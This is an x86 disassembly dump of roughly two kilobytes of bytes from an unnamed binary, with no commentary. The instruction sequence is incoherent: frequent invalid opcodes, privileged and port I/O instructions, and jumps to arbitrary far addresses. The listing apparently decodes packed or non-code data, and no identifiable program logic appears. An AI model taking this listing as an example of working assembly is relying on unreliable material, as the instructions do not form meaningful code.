  40893b:	jbe    0x4089a9
  40893d:	(bad)  
  40893f:	xor    edx,esp
  408941:	adc    dl,BYTE PTR [ecx+0x65ba3d8e]
  408947:	or     edi,eax
  408949:	cli    
  40894a:	mov    eax,0xcbfa43a5
  40894f:	loope  0x408920
  408951:	test   eax,0x66fd6ea2
  408956:	mov    al,0xd2
  408958:	or     ebp,ecx
  40895a:	mov    ds:0x2bddfa0,eax
  40895f:	loope  0x4089bb
  408961:	xor    DWORD PTR [esi-0x51],esi
  408964:	hlt    
  408965:	mov    fs,WORD PTR [ebx+0x48a518a6]
  40896b:	mov    ebx,0x29cec7e7
  408970:	push   eax
  408971:	dec    ebx
  408972:	and    ch,dh
  408974:	aas    
  408975:	jmp    0x4089a8
  408977:	icebp  
  408978:	jg     0x408973
  40897a:	sbb    DWORD PTR [ecx],edx
  40897c:	or     eax,0xd0cdb068
  408981:	shr    BYTE PTR [ebx-0xd],0x73
  408985:	(bad)  
  408986:	mov    ds:0xfac5b8c6,eax
  40898b:	dec    edi
  40898c:	xchg   BYTE PTR [ebx+0x25c89b73],dh
  408992:	inc    edi
  408993:	jmp    0x6cc:0x3f3633ed
  40899a:	std    
  40899b:	push   0x2d
  40899d:	push   0x4
  40899f:	xor    DWORD PTR [edx+0x61],edx
  4089a2:	popf   
  4089a3:	jl     0x4089f5
  4089a5:	fisttp WORD PTR [ebx+0x30]
  4089a8:	hlt    
  4089a9:	inc    edi
  4089aa:	sbb    cl,BYTE PTR [ebx]
  4089ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089ad:	ficom  DWORD PTR [edx+0x29]
  4089b0:	adc    ah,bh
  4089b2:	iret   
  4089b3:	rol    eax,0x63
  4089b6:	push   ebp
  4089b7:	in     al,0x55
  4089b9:	rol    ah,0x16
  4089bc:	mov    bh,0xfa
  4089be:	leave  
  4089bf:	xor    al,0xfc
  4089c1:	clc    
  4089c2:	jge    0x40898d
  4089c4:	sub    eax,0xb626b7b4
  4089c9:	cld    
  4089ca:	mov    dh,0xa6
  4089cc:	(bad)  
  4089cd:	not    BYTE PTR [edx-0x4f795df9]
  4089d3:	fcomi  st,st(7)
  4089d5:	mov    dl,0xe5
  4089d7:	pop    edx
  4089d8:	jns    0x408a55
  4089da:	xchg   esp,eax
  4089db:	cwde   
  4089dc:	aam    0x80
  4089de:	bound  edi,QWORD PTR [ebx]
  4089e0:	les    esp,FWORD PTR [eax-0x5e]
  4089e3:	jl     0x4089fc
  4089e5:	into   
  4089e6:	lock mov ch,0x87
  4089ea:	sbb    eax,0xf54259e3
  4089ef:	inc    eax
  4089f0:	lea    ecx,[eax+0x5e]
  4089f3:	imul   eax,DWORD PTR [ebx+0x18],0xffffffae
  4089f7:	sub    BYTE PTR [edi-0x66],cl
  4089fa:	ficom  WORD PTR [ebp-0x477234c2]
  408a00:	jo     0x4089a7
  408a02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a03:	rcr    DWORD PTR [edi+0x7ba8ade3],0xfc
  408a0a:	das    
  408a0b:	jecxz  0x408a72
  408a0d:	aad    0x38
  408a0f:	xchg   edx,eax
  408a10:	sbb    DWORD PTR [ebx+esi*2],ebp
  408a13:	fild   DWORD PTR [ecx+edi*2+0x2d]
  408a17:	and    eax,0xf1befe42
  408a1c:	aaa    
  408a1d:	sub    al,0xb8
  408a1f:	test   eax,0x6006a02c
  408a24:	loop   0x4089df
  408a26:	push   esp
  408a28:	neg    BYTE PTR [eax+0x36d30654]
  408a2e:	inc    ebp
  408a2f:	dec    ebp
  408a30:	pop    eax
  408a31:	fnclex 
  408a33:	ins    BYTE PTR es:[edi],dx
  408a34:	test   BYTE PTR [eax+0x27],cl
  408a37:	dec    ecx
  408a38:	mov    dh,0x24
  408a3a:	add    cl,0x6
  408a3d:	aad    0xa4
  408a3f:	imul   ebp,DWORD PTR [esi-0x5],0xf9111338
  408a46:	fwait
  408a47:	aam    0xf8
  408a49:	icebp  
  408a4a:	dec    ebp
  408a4b:	fiadd  DWORD PTR [ebx]
  408a4d:	call   0x25fb3f88
  408a52:	mov    es,ecx
  408a54:	call   0xc284:0xf3b2f755
  408a5b:	push   edi
  408a5c:	ror    dh,cl
  408a5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a5f:	xchg   esp,eax
  408a60:	mov    eax,ds:0x8f38c4cf
  408a65:	dec    ebp
  408a66:	fld    TBYTE PTR [ecx]
  408a68:	out    dx,eax
  408a69:	jae    0x408aa3
  408a6b:	cmc    
  408a6c:	sub    BYTE PTR [edx-0x62],bh
  408a6f:	jecxz  0x408a1b
  408a71:	imul   ebp,DWORD PTR [ebx-0x13],0x31a5de74
  408a78:	sbb    al,BYTE PTR [edx-0x4c]
  408a7b:	int3   
  408a7c:	test   DWORD PTR [edx-0x62e49ba0],edi
  408a82:	repz ds jno 0x408ae4
  408a86:	sub    al,0x23
  408a88:	mov    al,ds:0xa6f513aa
  408a8d:	addr16 jmp 0x75c84a9d
  408a93:	mov    WORD PTR [edx],ds
  408a95:	(bad)  
  408a96:	mov    ss,ebx
  408a98:	xchg   ecx,eax
  408a99:	cmp    DWORD PTR [eax],edx
  408a9b:	xchg   edx,eax
  408a9c:	sub    BYTE PTR [edx],0xd8
  408a9f:	pop    eax
  408aa0:	push   esi
  408aa1:	push   ebx
  408aa2:	stc    
  408aa3:	mov    al,0xbc
  408aa5:	or     DWORD PTR [ecx],esi
  408aa7:	adc    BYTE PTR [edi-0x57],cl
  408aaa:	pop    ebp
  408aab:	and    DWORD PTR [esi],edi
  408aad:	rol    BYTE PTR [ecx+ecx*4],1
  408ab0:	jne    0x408a42
  408ab2:	in     al,dx
  408ab3:	and    ecx,DWORD PTR [eax+edi*2+0x63990c0b]
  408aba:	hlt    
  408abb:	cmp    BYTE PTR [edx-0x58],0x9c
  408abf:	sbb    BYTE PTR ds:0xfbb9f7ea,0xe2
  408ac6:	es pop edi
  408ac8:	lock push 0x8f9518b0
  408ace:	lds    ecx,FWORD PTR [eax]
  408ad0:	sbb    edx,DWORD PTR [edi+ebx*8]
  408ad3:	inc    esp
  408ad4:	jmp    0xb9b9:0x457bfa93
  408adb:	xchg   DWORD PTR [edi],ecx
  408add:	sti    
  408ade:	push   eax
  408adf:	and    al,0x72
  408ae1:	jl     0x408ab4
  408ae3:	stc    
  408ae4:	shl    BYTE PTR [eax],cl
  408ae6:	mov    edi,0x8197f7c7
  408aeb:	pusha  
  408aec:	ret    0x5264
  408aef:	lds    edi,FWORD PTR [esi+0x4b]
  408af2:	pop    esi
  408af3:	adc    eax,0x7c505fc5
  408af8:	dec    edi
  408af9:	mov    edx,0x3f603f5
  408afe:	mov    dh,0x65
  408b00:	mov    al,0x78
  408b02:	retf   0x6536
  408b05:	add    eax,0x3cfbf20c
  408b0a:	pop    ebx
  408b0b:	out    0xe7,eax
  408b0d:	add    DWORD PTR [esi-0x50],0xffffffaa
  408b11:	aaa    
  408b12:	push   es
  408b13:	loope  0x408aba
  408b15:	pop    edx
  408b16:	cld    
  408b17:	mov    bh,0xf5
  408b19:	out    dx,eax
  408b1a:	xor    dl,dh
  408b1c:	jecxz  0x408ad9
  408b1e:	cmp    BYTE PTR [edx+0x68],bh
  408b21:	jl     0x408b17
  408b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b24:	fcom   QWORD PTR [ecx+0x2b]
  408b27:	dec    esp
  408b28:	fsubr  st,st(2)
  408b2a:	xchg   ebp,eax
  408b2b:	mov    eax,0x5365a82b
  408b30:	mov    ah,0xd8
  408b32:	pop    edi
  408b33:	mov    edx,0xff49c7b4
  408b38:	cmp    al,al
  408b3a:	or     eax,0x642f0ea8
  408b3f:	jl     0x408b5e
  408b41:	and    ebx,DWORD PTR [edx]
  408b43:	fadd   st(5),st
  408b45:	xor    eax,0xfb002003
  408b4a:	std    
  408b4b:	ror    BYTE PTR [edx+0x2e],1
  408b4e:	dec    edx
  408b4f:	mov    bl,0x51
  408b51:	aam    0x17
  408b53:	add    eax,0x8aa1bada
  408b58:	shl    ah,cl
  408b5a:	or     DWORD PTR [esi+0x10],0x28
  408b5e:	jno    0x408bae
  408b60:	jg     0x408bda
  408b62:	pop    ebp
  408b63:	add    al,dh
  408b65:	pop    eax
  408b66:	out    dx,eax
  408b67:	addr16 fsubrp st(1),st
  408b6a:	xor    ecx,esi
  408b6c:	mov    ebx,0x988a2cb7
  408b71:	xchg   ebx,eax
  408b72:	into   
  408b73:	sahf   
  408b74:	sub    al,0x77
  408b76:	push   es
  408b77:	loop   0x408afb
  408b79:	scas   eax,DWORD PTR es:[edi]
  408b7a:	jb     0x408b07
  408b7c:	idiv   DWORD PTR [ebx-0x7f5a10e3]
  408b82:	inc    ecx
  408b83:	lea    ebx,[ebx+0x76421d79]
  408b89:	dec    edx
  408b8a:	xchg   edx,eax
  408b8b:	std    
  408b8c:	xchg   BYTE PTR [ebp+0x59],dl
  408b8f:	psllq  mm7,QWORD PTR [edi+0x0]
  408b93:	add    eax,0x678470
  408b98:	popf   
  408b99:	ins    BYTE PTR es:[edi],dx
  408b9a:	cmc    
  408b9b:	loopne 0x408bd3
  408b9d:	sub    BYTE PTR [ebx],dh
  408b9f:	fst    st(2)
  408ba1:	cdq    
  408ba2:	inc    esi
  408ba3:	ss xor edx,ebp
  408ba6:	ret    0xf1d4
  408ba9:	repz pop ds
  408bab:	sbb    al,0x5
  408bad:	test   BYTE PTR ds:0xd27a31c2,bl
  408bb3:	sub    al,0x63
  408bb5:	sahf   
  408bb6:	pop    ecx
  408bb7:	cmp    BYTE PTR [ecx+0x652c8989],al
  408bbd:	xor    edi,DWORD PTR [edi+edx*8]
  408bc0:	jae    0x408bba
  408bc2:	sbb    bh,BYTE PTR [edx]
  408bc4:	cmp    DWORD PTR [eax],esi
  408bc6:	ret    
  408bc7:	idiv   BYTE PTR [esi+0x2ac4f7b6]
  408bcd:	inc    ebx
  408bce:	in     al,dx
  408bcf:	repnz rol BYTE PTR [eax+eax*2+0x36],cl
  408bd4:	jecxz  0x408c2e
  408bd6:	sub    eax,0x6eea8acf
  408bdb:	jbe    0x408c04
  408bdd:	into   
  408bde:	inc    ecx
  408bdf:	lock daa 
  408be1:	out    dx,al
  408be2:	dec    ebp
  408be3:	inc    eax
  408be4:	adc    esp,DWORD PTR [edx]
  408be6:	mov    edi,0xea24c6d7
  408beb:	add    BYTE PTR ds:0xa1807472,0xfd
  408bf2:	mov    edi,0xfc6f7ddf
  408bf7:	aam    0x4c
  408bf9:	push   0x7325594a
  408bfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bff:	dec    edx
  408c00:	popa   
  408c01:	mov    ah,0x86
  408c03:	dec    esp
  408c04:	iret   
  408c05:	sub    ch,BYTE PTR [ebx]
  408c07:	call   0xeb3fca9
  408c0c:	adc    cl,BYTE PTR [ebp-0x5c]
  408c0f:	inc    eax
  408c10:	sti    
  408c11:	aad    0xe7
  408c13:	pop    ss
  408c14:	pop    esp
  408c15:	push   edi
  408c16:	cwde   
  408c17:	outs   dx,DWORD PTR ds:[esi]
  408c18:	cmp    bl,cl
  408c1a:	adc    DWORD PTR [edi-0x12],ebx
  408c1d:	sub    eax,0xf15a560f
  408c22:	cmp    eax,0x2a77263c
  408c27:	mov    al,ds:0x21f2cea9
  408c2c:	xchg   esp,eax
  408c2d:	mov    cl,0x85
  408c2f:	inc    ebp
  408c30:	mov    esi,0x76357002
  408c35:	or     al,0xdc
  408c37:	mov    dh,0x14
  408c39:	pop    ds
  408c3a:	mov    cl,0xae
  408c3c:	mov    al,0xf2
  408c3e:	test   DWORD PTR [ebx],edi
  408c40:	test   BYTE PTR [eax+0x3bd9a6cb],ch
  408c46:	mov    ecx,0x5f435276
  408c4b:	js     0x408cc2
  408c4d:	fidivr WORD PTR [edi-0x91a814d]
  408c53:	and    DWORD PTR [eax],ebx
  408c55:	cmp    BYTE PTR [edi+0x6cdd4862],ah
  408c5b:	mov    ebx,DWORD PTR [eax]
  408c5d:	ror    DWORD PTR [ecx+0x22],cl
  408c60:	cdq    
  408c61:	std    
  408c62:	push   ds
  408c63:	lods   al,BYTE PTR ds:[esi]
  408c64:	add    eax,0x4fe718eb
  408c69:	cld    
  408c6a:	xlat   BYTE PTR ds:[ebx]
  408c6b:	inc    ebp
  408c6c:	dec    ecx
  408c6d:	push   ecx
  408c6e:	leave  
  408c6f:	ss push ebp
  408c71:	sub    eax,edi
  408c73:	lahf   
  408c74:	cmp    BYTE PTR [eax+0x6f088238],dl
  408c7a:	sti    
  408c7b:	jmp    0x48ce07ed
  408c80:	push   es
  408c81:	sti    
  408c82:	mov    esi,0xca00eb0
  408c87:	mov    BYTE PTR [ecx+0x174f57f],bh
  408c8d:	dec    esi
  408c8e:	loope  0x408c7e
  408c90:	fimul  DWORD PTR [edx]
  408c92:	or     DWORD PTR [esi+0x6d],esp
  408c95:	sbb    cl,dl
  408c97:	dec    edx
  408c98:	rcl    DWORD PTR [edx*8+0x1b5ac3bd],0xfb
  408ca0:	mov    ebx,DWORD PTR [eax+0xccd651]
  408ca6:	loope  0x408c93
  408ca8:	ss xchg esi,eax
  408caa:	call   0xc2b9ad20
  408caf:	loop   0x408d12
  408cb1:	cmp    eax,ebx
  408cb3:	cmp    al,0x5
  408cb5:	in     eax,0x8a
  408cb7:	jo     0x408c4c
  408cb9:	push   eax
  408cba:	(bad)  
  408cbb:	daa    
  408cbc:	push   ds
  408cbd:	fcmovnbe st,st(6)
  408cbf:	xor    esi,DWORD PTR [edi+0xbf57866]
  408cc5:	sar    DWORD PTR [ebx-0x69],1
  408cc8:	popf   
  408cc9:	ret    
  408cca:	es mov bh,0x36
  408ccd:	outs   dx,DWORD PTR ds:[esi]
  408cce:	in     eax,0x71
  408cd0:	aad    0xa7
  408cd2:	mov    edi,0x58c79d89
  408cd7:	fdivr  DWORD PTR [edx+0x28]
  408cda:	jb     0x408d2d
  408cdc:	cmp    cl,BYTE PTR [ebx+0x175c464]
  408ce2:	adc    al,0xea
  408ce4:	nop
  408ce5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ce6:	(bad)  
  408ce7:	cmc    
  408ce8:	mov    cl,0x34
  408cea:	cmp    BYTE PTR [edi+ecx*8+0x4e],0xec
  408cef:	xor    al,0xb4
  408cf1:	pop    edx
  408cf2:	ja     0x408cc0
  408cf4:	fnstsw ax
  408cf6:	in     al,dx
  408cf7:	mov    BYTE PTR [ecx+eiz*8],dl
  408cfa:	dec    ebx
  408cfb:	and    ebp,edx
  408cfd:	(bad)  
  408cfe:	out    0x75,al
  408d00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d01:	imul   esi,DWORD PTR [ebx-0x10cb0981],0xfffffffc
  408d08:	out    dx,eax
  408d09:	or     esi,DWORD PTR cs:[edx]
  408d0c:	mov    edi,0x61dab5e1
  408d11:	mov    edx,0xdbe714b6
  408d16:	cld    
  408d17:	xor    DWORD PTR [ebx+0x39],0x36
  408d1b:	sub    al,0x5c
  408d1d:	adc    bh,BYTE PTR [edx+0x50]
  408d20:	scas   eax,DWORD PTR es:[edi]
  408d21:	test   BYTE PTR [esi-0x883c932],dh
  408d27:	ins    BYTE PTR es:[edi],dx
  408d28:	clc    
  408d29:	scas   eax,DWORD PTR es:[edi]
  408d2a:	or     BYTE PTR gs:[edx-0x572ff530],al
  408d31:	ret    
  408d32:	sub    DWORD PTR [ebp+0x46],esi
  408d35:	ret    
  408d36:	mov    eax,0x536b2f83
  408d3b:	inc    DWORD PTR [ebx-0x5e6bb05a]
  408d41:	push   ss
  408d42:	jl     0x408d81
  408d44:	sahf   
  408d45:	add    eax,0xecf2ccfd
  408d4a:	mov    eax,0x5802e752
  408d4f:	xor    DWORD PTR [ebp-0x6d],0x61
  408d53:	xor    edi,esp
  408d55:	stos   BYTE PTR es:[edi],al
  408d56:	sbb    BYTE PTR [edi+0x35],bh
  408d59:	loop   0x408d21
  408d5b:	jle    0x408d5b
  408d5d:	push   DWORD PTR [edx]
  408d5f:	aad    0x7b
  408d61:	mov    ch,0xde
  408d63:	fisub  DWORD PTR [esp+edi*2-0x5bda140]
  408d6a:	std    
  408d6b:	sub    ah,BYTE PTR [edx+0x78]
  408d6e:	mov    fs:0x72956ec1,al
  408d74:	inc    esi
  408d75:	out    dx,al
  408d76:	call   0x7e80:0x6d0b294f
  408d7d:	and    edx,DWORD PTR [esi+edi*8]
  408d80:	lods   al,BYTE PTR ds:[esi]
  408d81:	mov    ah,bl
  408d83:	xchg   al,al
  408d85:	add    ah,BYTE PTR [ecx-0x329e4d05]
  408d8b:	jbe    0x408d23
  408d8d:	mov    esp,0x8767a8c2
  408d92:	dec    esi
  408d93:	les    eax,FWORD PTR [ebx-0x50]
  408d96:	mov    ebp,0xc252eea5
  408d9b:	push   es
  408d9c:	mov    ebx,DWORD PTR [eax+ebp*4+0x35]
  408da0:	inc    eax
  408da1:	inc    ecx
  408da2:	mov    ecx,0xe6489cde
  408da7:	je     0x408dbf
  408da9:	jge    0x408d79
  408dab:	mov    eax,ds:0x8bf62c3a
  408db0:	jns    0x408db9
  408db2:	ret    0x202
  408db5:	sbb    dl,BYTE PTR [edi]
  408db7:	(bad)  [esi]
  408db9:	mov    eax,ds:0x34ed1656
  408dbe:	enter  0x2b5f,0xd5
  408dc2:	sar    DWORD PTR [eax+0x0],cl
  408dc5:	mov    eax,ds:0x36e6fec6
  408dca:	ins    DWORD PTR es:[edi],dx
  408dcb:	int    0x71
  408dcd:	je     0x408e16
  408dcf:	xchg   ecx,eax
  408dd0:	push   esp
  408dd1:	cmp    DWORD PTR [edi],ebp
  408dd3:	das    
  408dd4:	(bad)  
  408dd5:	stc    
  408dd6:	ret    
  408dd7:	das    
  408dd8:	popf   
  408dd9:	jle    0x408dd6
  408ddb:	enter  0xcf1d,0xeb
  408ddf:	sbb    BYTE PTR [eax+ebx*8],dh
  408de2:	adc    al,0x2c
  408de4:	ins    BYTE PTR es:[edi],dx
  408de5:	aad    0xb3
  408de7:	add    BYTE PTR [esi],ah
  408de9:	lods   eax,DWORD PTR ds:[esi]
  408dea:	(bad)  
  408deb:	jp     0x408e42
  408ded:	push   cs
  408dee:	cmp    al,0xea
  408df0:	xchg   esi,eax
  408df1:	(bad)  
  408df2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408df3:	in     eax,0x5b
  408df5:	retf   0x2577
  408df8:	and    DWORD PTR [edx],ebp
  408dfa:	repnz lahf 
  408dfc:	mov    edi,0x4b380943
  408e01:	mov    DWORD PTR [ebx-0x2d082c2a],eax
  408e07:	dec    ecx
  408e08:	xor    dh,cl
  408e0a:	dec    ebx
  408e0b:	test   DWORD PTR [edx-0x3ba6b698],ebp
  408e11:	std    
  408e12:	adc    eax,0xbc45022a
  408e17:	push   ebx
  408e18:	sbb    ax,0x2709
  408e1c:	mov    ebx,eax
  408e1e:	fiadd  DWORD PTR [edx-0xe709def]
  408e24:	fwait
  408e25:	xchg   BYTE PTR [edi],bh
  408e27:	sar    BYTE PTR [edi],1
  408e29:	cmp    DWORD PTR [esi],eax
  408e2b:	jp     0x408ea0
  408e2d:	xor    esp,0x60
  408e30:	dec    ebp
  408e31:	mov    eax,ds:0xdc634e9e
  408e36:	mov    dh,BYTE PTR [eax-0x36]
  408e39:	lea    ebx,[edi]
  408e3b:	mov    dh,0xee
  408e3d:	enter  0xaa22,0x81
  408e41:	sbb    eax,0xe77fff6e
  408e46:	push   ebp
  408e47:	xchg   ebx,eax
  408e48:	jns    0x408e89
  408e4a:	adc    al,0x18
  408e4c:	sbb    al,0xb4
  408e4e:	inc    ebp
  408e4f:	jmp    0x408dee
  408e51:	inc    esp
  408e52:	leave  
  408e53:	push   cs
  408e54:	in     al,dx
  408e55:	mov    bl,0xab
  408e57:	sahf   
  408e58:	bound  ebx,QWORD PTR [ecx-0x2b]
  408e5b:	add    al,0xd0
  408e5d:	out    dx,al
  408e5e:	mov    eax,0x6ee0f70d
  408e63:	(bad)  
  408e64:	lods   al,BYTE PTR ds:[esi]
  408e65:	in     al,dx
  408e66:	xor    DWORD PTR [edi-0x66a62ef0],esp
  408e6c:	cli    
  408e6d:	fmul   DWORD PTR [edi+esi*1-0x6c]
  408e71:	xchg   esi,eax
  408e72:	or     bh,BYTE PTR [ebp-0x1b3dcd70]
  408e78:	mov    cl,BYTE PTR [ebp-0x7dd0072a]
  408e7e:	mov    dh,BYTE PTR [eax]
  408e80:	enter  0x669c,0x2f
  408e84:	mov    edx,edi
  408e86:	aad    0xc2
  408e88:	jo     0x408e3b
  408e8a:	dec    esp
  408e8b:	sub    DWORD PTR [ebp+0x55],0xffffffc1
  408e8f:	or     al,0x1c
  408e91:	adc    dh,BYTE PTR [edi]
  408e93:	aad    0x18
  408e95:	scas   al,BYTE PTR es:[edi]
  408e96:	(bad)  
  408e97:	push   esp
  408e98:	add    DWORD PTR [ebp+0x79af66c5],esp
  408e9e:	inc    esi
  408e9f:	cmp    BYTE PTR [edi],ah
  408ea1:	xor    eax,0x7a78fd82
  408ea6:	leave  
  408ea7:	mov    bh,0xa9
  408ea9:	xor    bh,BYTE PTR [edx]
  408eab:	pop    ebp
  408eac:	sti    
  408ead:	test   eax,ebx
  408eaf:	and    al,0x2b
  408eb1:	repz int3 
  408eb3:	pop    esi
  408eb4:	les    ebx,FWORD PTR [edx+esi*1]
  408eb7:	and    DWORD PTR [esi],eax
  408eb9:	adc    dl,BYTE PTR ds:0x6698d8e8
  408ebf:	aad    0x25
  408ec1:	or     DWORD PTR [ebx+0x55],esi
  408ec4:	loope  0x408e6e
  408ec6:	xor    DWORD PTR [edx-0x1a],edx
  408ec9:	or     al,0x2
  408ecb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ecc:	dec    esp
  408ecd:	mov    BYTE PTR [ebx],bl
  408ecf:	ja     0x408f2c
  408ed1:	cmp    BYTE PTR [esi+0x4628a690],0xca
  408ed8:	aas    
  408ed9:	aas    
  408eda:	outs   dx,BYTE PTR ds:[esi]
  408edb:	lds    eax,FWORD PTR [edx+0x3028ee7f]
  408ee1:	jp     0x408f40
  408ee3:	shl    edx,0xe8
  408ee6:	mov    ah,0xcf
  408ee8:	outs   dx,BYTE PTR ds:[esi]
  408ee9:	add    DWORD PTR [esi],ecx
  408eeb:	sahf   
  408eec:	ja     0x408f47
  408eee:	mov    eax,DWORD PTR [eax]
  408ef0:	mov    ebp,DWORD PTR [edi+0x102ed80a]
  408ef6:	jle    0x408f0b
  408ef8:	dec    edi
  408ef9:	mov    esi,0x5ea77fe6
  408efe:	xchg   edi,eax
  408eff:	dec    esp
  408f00:	cmp    BYTE PTR [edi-0x3c716bdd],al
  408f06:	mov    ebp,0xf48eb2a2
  408f0b:	mov    DWORD PTR [edx+0x6bfe8fc7],edx
  408f11:	jb     0x408f86
  408f13:	stc    
  408f14:	clc    
  408f15:	dec    ebp
  408f16:	(bad)  
  408f18:	les    ecx,FWORD PTR [ecx-0x3ce16007]
  408f1e:	in     al,0x47
  408f20:	dec    ebp
  408f21:	mov    cl,0xd3
  408f23:	(bad)  
  408f24:	jne    0x408f15
  408f26:	repnz aas 
  408f28:	shl    DWORD PTR [edx],1
  408f2a:	fbstp  TBYTE PTR [ecx+edi*1-0x701b07f0]
  408f31:	jp     0x408f43
  408f33:	sbb    ebp,ecx
  408f35:	in     al,0x81
  408f37:	leave  
  408f38:	lock inc edx
  408f3a:	sub    edx,DWORD PTR [edi-0x24fe8da0]
  408f40:	adc    al,0xcf
  408f42:	adc    esp,DWORD PTR [edi+0x2f]
  408f45:	sub    edx,DWORD PTR [esi-0x72]
  408f48:	adc    al,cl
  408f4a:	(bad)  
  408f4b:	dec    ecx
  408f4c:	dec    ecx
  408f4d:	xor    al,0x62
  408f4f:	pop    ebx
  408f50:	dec    edi
  408f51:	dec    esp
  408f52:	push   edx
  408f53:	ins    DWORD PTR es:[edi],dx
  408f54:	jmp    0xf2b4:0xe19e53eb
  408f5b:	cmovo  ebx,esp
  408f5e:	mul    DWORD PTR [ecx]
  408f60:	mov    ch,0x52
  408f62:	out    dx,al
  408f63:	sub    al,0xa2
  408f65:	add    BYTE PTR [esp+ebp*8-0x57],0x3f
  408f6a:	jbe    0x408fc6
  408f6c:	inc    esi
  408f6d:	dec    edx
  408f6e:	pop    ebx
  408f6f:	push   ebx
  408f70:	sub    dl,dh
  408f72:	mov    BYTE PTR [eax+0x1fad624],0xf3
  408f79:	and    cl,BYTE PTR [ecx+0x32]
  408f7c:	mov    DWORD PTR [edi-0x581afc4c],0x1cc296e8
  408f86:	xchg   eax,edi
  408f88:	xchg   ebp,eax
  408f89:	add    al,0x82
  408f8b:	outs   dx,BYTE PTR ds:[esi]
  408f8c:	push   ss
  408f8d:	inc    esi
  408f8e:	das    
  408f8f:	pushf  
  408f90:	xor    BYTE PTR [esi],cl
  408f92:	bound  ecx,QWORD PTR [edx+0x7f2d156a]
  408f98:	jle    0x408f1d
  408f9a:	out    dx,eax
  408f9b:	inc    edx
  408f9c:	sub    eax,0xa26b757b
  408fa1:	mov    eax,ds:0xff86d7f9
  408fa6:	and    BYTE PTR [esi],bh
  408fa8:	cmp    eax,eax
  408faa:	xchg   edi,eax
  408fab:	aam    0x2b
  408fad:	ins    BYTE PTR es:[edi],dx
  408fae:	jnp    0x409013
  408fb0:	add    dl,BYTE PTR [eax-0x2d]
  408fb3:	fimul  WORD PTR [ecx-0x38]
  408fb6:	addr16 push esi
  408fb8:	bound  eax,QWORD PTR [eax]
  408fba:	(bad)  
  408fbb:	outs   dx,DWORD PTR ds:[esi]
  408fbc:	lahf   
  408fbd:	sub    al,0x2c
  408fbf:	inc    edx
  408fc0:	(bad)  
  408fc1:	or     esp,DWORD PTR [eax-0x5d]
  408fc4:	sbb    ebx,DWORD PTR [edx]
  408fc6:	retf   0xbf4
  408fc9:	aas    
  408fca:	out    0x56,eax
  408fcc:	xchg   edx,eax
  408fcd:	pop    ecx
  408fce:	ficom  DWORD PTR [eax-0x37]
  408fd1:	rcl    DWORD PTR [ebx],1
  408fd3:	shr    DWORD PTR [edi-0x6d],0x36
  408fd7:	mov    cl,0x91
  408fd9:	cmp    DWORD PTR [ecx+0x3eb229ee],esp
  408fdf:	pop    esi
  408fe0:	aas    
  408fe1:	(bad)  
  408fe2:	pop    esp
  408fe3:	stc    
  408fe4:	cld    
  408fe5:	adc    BYTE PTR [esi-0x37],bl
  408fe8:	jns    0x408f8d
  408fea:	push   edx
  408feb:	iret   
  408fec:	xchg   edi,eax
  408fed:	mov    bh,0x73
  408fef:	scas   eax,DWORD PTR es:[edi]
  408ff0:	sub    ebx,DWORD PTR ds:0xe93d6003
  408ff6:	hlt    
  408ff7:	ror    BYTE PTR [eax+0x4b],1
  408ffa:	dec    ecx
  408ffb:	sub    al,BYTE PTR [eax+0x7f6b1550]
  409001:	mov    WORD PTR [esi+0x70ee575a],ss
  409007:	inc    ebp
  409008:	scas   eax,DWORD PTR es:[edi]
  409009:	js     0x408fe8
  40900b:	lahf   
  40900c:	sub    DWORD PTR [eax+0x4258e519],esp
  409012:	je     0x408fc8
  409014:	jae    0x40901f
  409016:	push   ebp
  409017:	frstor [ebx+0x5c]
  40901a:	das    
  40901b:	addr16 enter 0x9d90,0x2d
  409020:	jmp    0xe765e336
  409025:	jecxz  0x408fe2
  409027:	inc    eax
  409028:	(bad)  
  409029:	sar    BYTE PTR [edi-0x1],cl
  40902c:	pop    edx
  40902d:	shl    edx,1
  40902f:	das    
  409030:	(bad)  
  409031:	aam    0x96
  409033:	pop    ds
  409034:	mov    bh,0xd5
  409036:	leave  
  409037:	in     eax,0x19
  409039:	aas    
  40903a:	int3   
  40903b:	adc    cl,bl
  40903d:	add    edi,ecx
  40903f:	add    BYTE PTR [ebp+0x5b],0x14
  409043:	fnstcw WORD PTR [edi-0x12e9607a]
  409049:	or     al,0x44
  40904b:	pop    edi
  40904c:	sub    BYTE PTR [ecx-0x20],al
  40904f:	es in  al,dx
  409051:	in     al,0xe5
  409053:	jmp    0x408fdc
  409055:	retf   
  409056:	popa   
  409057:	mov    edi,0x451afada
  40905c:	(bad)  
  40905d:	cmp    eax,0xd8d9d1d4
  409062:	push   ebx
  409063:	sbb    al,0xaf
  409065:	jns    0x40907e
  409067:	mov    cl,0xf8
  409069:	outs   dx,BYTE PTR ds:[esi]
  40906a:	lods   al,BYTE PTR ds:[esi]
  40906b:	xchg   ebp,eax
  40906c:	mov    esi,esi
  40906e:	mov    esp,0x88da320e
  409073:	add    ch,BYTE PTR [esi]
  409075:	pusha  
  409076:	sub    eax,0xfb444930
  40907b:	jbe    0x409082
  40907d:	ret    0x1d06
  409080:	and    eax,ebx
  409082:	xchg   edx,eax
  409083:	xor    DWORD PTR [edi-0x309187ae],0xfffffffc
  40908a:	jb     0x409040
  40908c:	push   edi
  40908d:	fdivr  DWORD PTR [esi+edx*2]
  409090:	dec    cx
  409092:	mov    al,ds:0x3d3f6027
  409097:	not    DWORD PTR [esi+0x791a0a76]
  40909d:	xchg   cl,ch
  40909f:	ret    
  4090a0:	and    edx,DWORD PTR [eax]
  4090a2:	call   0x10b34593
  4090a7:	inc    ebp
  4090a8:	cdq    
  4090a9:	push   ss
  4090aa:	sub    DWORD PTR [esi],edi
  4090ac:	or     DWORD PTR [edx+0x1830f26f],edi
  4090b2:	stos   BYTE PTR es:[edi],al
  4090b3:	mov    ah,0x28
  4090b5:	lods   al,BYTE PTR ds:[esi]
  4090b6:	push   ss
  4090b7:	shl    DWORD PTR [ecx+0x58],1
  4090ba:	lods   al,BYTE PTR ds:[esi]
  4090bb:	ins    BYTE PTR es:[edi],dx
  4090bc:	xor    dh,BYTE PTR [ebp-0x51]
